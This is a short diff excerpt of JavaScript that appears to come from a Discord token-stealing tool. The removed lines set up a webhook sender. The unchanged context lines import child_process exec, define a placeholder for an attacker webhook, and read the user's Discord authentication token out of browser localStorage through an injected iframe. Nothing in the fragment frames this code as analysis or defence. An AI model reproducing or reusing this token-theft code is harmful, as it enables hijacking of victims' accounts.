@@ -5,8 +5,6 @@ const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const dawebhook = "%WEBHOUK%1"
-const { Webhook, MessageBuilder } = require('discord-webhook-sender');
-const hook = new Webhook(dawebhook)
 
 const FnLComa = /^"|"$/g;
 const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token.replace(FnLComa, '')
